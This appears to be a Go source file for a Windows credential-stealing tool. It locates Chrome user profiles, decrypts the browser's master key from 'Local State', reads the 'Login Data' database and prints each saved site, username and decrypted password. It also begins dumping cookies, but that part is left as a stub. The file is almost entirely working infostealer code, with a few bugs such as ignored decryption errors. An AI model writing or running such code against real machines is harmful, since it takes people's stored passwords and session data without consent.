package internals

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
)

const CHROME_PATH_WIN = "\\AppData\\Local\\Google\\Chrome\\User Data\\"

type Chrome struct {
	name          string
	profilePaths  []string // .../Profile X
	decryptionKey []byte   // found in "Local State"
}

func NewChrome() (Chrome, error) {
	profilePaths, err := getChromeProfiles()
	if err != nil {
		return Chrome{"chrome", nil, nil}, err
	}

	decKey, err := getChromeDecryptionKey()
	if err != nil {
		return Chrome{"chrome", nil, nil}, err
	}

	return Chrome{"chrome", profilePaths, decKey}, nil
}

// Extract login credentials from Chrome "Login Data" file
func (c Chrome) DumpCredentials() ([][]Credentials, error) {
	dump := make([][]Credentials, len(c.profilePaths))
	for _, profile := range c.profilePaths {
		credentials, err := getChromeCredentials(fmt.Sprintf("%s\\%s", profile, "Login Data"))
		if err != nil {
			return nil, err
		}

		if len(credentials) == 0 {
			continue
		}

		fmt.Printf("> %s\n", profile)
		for _, creds := range credentials {
			c.DecryptPassword(&creds.password)
			fmt.Printf("\t| - %s ---> %s:%s\n", creds.loginUrl.Host, creds.username, string(creds.password))
		}
		dump = append(dump, credentials)
	}
	return dump, nil
}

func (c Chrome) DumpCookies() ([][]http.Cookie, error) {
	dump := make([][]http.Cookie, len(c.profilePaths))
	for _, profile := range c.profilePaths {
		cookies, err := getChromeCookies(fmt.Sprintf("%s\\%s\\%s", profile, "Network", "Cookies"))
		if err != nil {
			return nil, err
		}

		if len(cookies) == 0 {
			continue
		}

		fmt.Printf("> %s\n", profile)
		for _, cookie := range cookies {
			fmt.Printf("%s", cookie.String())
		}
		dump = append(dump, cookies)
	}
	return dump, nil
}

func (c Chrome) DecryptPassword(psw *[]byte) {
	password := *psw
	iv := password[3:15]
	ps := password[15:]

	block, err := aes.NewCipher(c.decryptionKey)
	if err != nil {
		panic(err.Error())
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}

	plain, err := aesgcm.Open(nil, iv, ps, nil)
	*psw = plain
}

func getChromeProfiles() ([]string, error) {
	homeDir, _ := os.UserHomeDir()
	profilePaths := make([]string, 0)

	path := filepath.Dir(fmt.Sprintf("%s%s", homeDir, CHROME_PATH_WIN))
	content, err := os.ReadDir(path)
	if err != nil {
		return profilePaths, err
	}

	localStateFound := false
	for _, entry := range content {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile") {
			profile := fmt.Sprintf("%s\\%s", path, entry.Name())
			profilePaths = append(profilePaths, profile)
		}

		if entry.Name() == "Local State" {
			localStateFound = true
		}
	}

	// Get chrome credentials decryption key
	if localStateFound {
		return profilePaths, nil
	} else {
		return profilePaths, errors.New("[!] Local State not found")
	}
}

func getChromeDecryptionKey() ([]byte, error) {
	homeDir, _ := os.UserHomeDir()
	stateFile, err := os.ReadFile(fmt.Sprintf("%s\\%s\\%s", homeDir, CHROME_PATH_WIN, "Local State"))
	if err != nil {
		return nil, err
	}
	var data struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	err = json.Unmarshal(stateFile, &data)
	if err != nil {
		return nil, err
	}
	keyEnc, err := base64.StdEncoding.DecodeString(data.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}

	// Decrypt the private key
	// Note: the first 5 bytes correspond to "DPAPI" (check with xxd)
	key, err := DecryptKey(keyEnc[5:])
	if err != nil {
		return nil, err
	}
	return key, nil
}

func getChromeCredentials(path string) ([]Credentials, error) {
	credentials := make([]Credentials, 0)
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		panic(err)
	}
	defer db.Close()

	selectStatement := "SELECT origin_url, username_value, password_value FROM logins"
	rows, err := db.Query(selectStatement)
	if err != nil {
		return credentials, err
	}

	defer rows.Close()
	for rows.Next() {
		var (
			loginUrlStr, user string
			pass              []byte
		)
		err = rows.Scan(&loginUrlStr, &user, &pass)
		if err != nil {
			return credentials, err
		}

		if loginUrlStr == "" || user == "" || pass == nil {
			continue
		}

		loginUrl, err := url.Parse(loginUrlStr)
		if err != nil {
			fmt.Printf("Error parsing %s: %s\n", loginUrlStr, err.Error())
		}
		credentials = append(credentials, Credentials{loginUrl, user, pass})
	}

	return credentials, nil
}

func getChromeCookies(path string) ([]http.Cookie, error) {
	cookies := make([]http.Cookie, 0)
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		panic(err)
	}
	defer db.Close()

	selectStatement := "SELECT name, encrypted_value, host_key, path, expires_utc FROM cookies"
	rows, err := db.Query(selectStatement)
	if err != nil {
		return cookies, err
	}

	defer rows.Close()
	for rows.Next() {
		var (
			name, host_key, path, expires_utc string
			encrypted_key                     []byte
		)

		err = rows.Scan(&name, &encrypted_key, &host_key, &path, &expires_utc)
		if err != nil {
			return cookies, err
		}

		if name == "" || host_key == "" || path == "" || expires_utc == "" || len(encrypted_key) == 0 {
			continue
		}

		// ...

	}

	return cookies, nil
}
